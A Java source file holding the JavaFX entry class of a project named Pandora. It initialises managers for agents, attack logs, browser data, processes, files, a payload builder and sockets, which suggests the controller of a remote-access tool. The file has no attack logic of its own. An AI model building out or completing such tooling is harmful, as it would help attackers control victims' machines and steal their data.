package org.pandora.master;

import javafx.application.Application;
import javafx.stage.Stage;
import lombok.Getter;
import org.pandora.master.builder.BuilderManager;
import org.pandora.master.data.agent.AgentData;
import org.pandora.master.data.agent.AgentManager;
import org.pandora.master.data.attack.LogData;
import org.pandora.master.data.attack.LogManager;
import org.pandora.master.data.browser.BrowserManager;
import org.pandora.master.data.files.FileManager;
import org.pandora.master.data.process.ProcessManager;
import org.pandora.master.decoding.DecodingManager;
import org.pandora.master.encoding.EncodingManager;
import org.pandora.master.export.Export;
import org.pandora.master.runnable.ExecutorRunnable;
import org.pandora.master.scene.SceneManager;
import org.pandora.master.stage.StageManager;
import org.pandora.master.utils.FileUtils;
import org.pandora.master.utils.Notification;
import org.pandora.master.utils.SocketUtils;

import java.util.concurrent.ConcurrentLinkedQueue;

public class Master extends Application {

    @Getter
    private LogManager logManager;
    @Getter
    private AgentManager agentManager;
    @Getter
    private ProcessManager processManager;
    @Getter
    private BrowserManager browserManager;
    @Getter
    private FileManager fileManager;
    @Getter
    private FileUtils fileUtils;
    @Getter
    private Notification notification;
    @Getter
    private SceneManager sceneManager;
    @Getter
    private StageManager stageManager;
    @Getter
    private BuilderManager builderManager;
    @Getter
    private EncodingManager encodingManager;
    @Getter
    private DecodingManager decodingManager;
    @Getter
    private SocketUtils socketUtils;
    @Getter
    private Export export;
    @Getter
    private ExecutorRunnable executorRunnable;
    public long startApp;
    public ConcurrentLinkedQueue<LogData> logData;
    public ConcurrentLinkedQueue<AgentData> agentData;

    @Override
    public void start(final Stage primaryStage) {
        try {
            this.startApp = System.currentTimeMillis();
            this.encodingManager = new EncodingManager();
            this.decodingManager = new DecodingManager();
            this.logData = new ConcurrentLinkedQueue<>();
            this.agentData = new ConcurrentLinkedQueue<>();
            this.stageManager = new StageManager();
            this.fileManager = new FileManager(this);
            this.logManager = new LogManager(this);
            this.agentManager = new AgentManager(this);
            this.browserManager = new BrowserManager(this);
            this.processManager = new ProcessManager(this);
            this.fileUtils = new FileUtils();
            this.export = new Export(this.fileUtils);
            this.socketUtils = new SocketUtils(this);
            this.fileUtils.create();
            this.executorRunnable = new ExecutorRunnable(this);
            this.executorRunnable.start();
            this.notification = new Notification(this);
            this.builderManager = new BuilderManager();
            this.sceneManager = new SceneManager(primaryStage, this);
            this.sceneManager.initialize();
        } catch (final Exception exception) {
            exception.printStackTrace();
        }
    }

    @Override
    public void stop() {
        System.exit(0);
    }
}
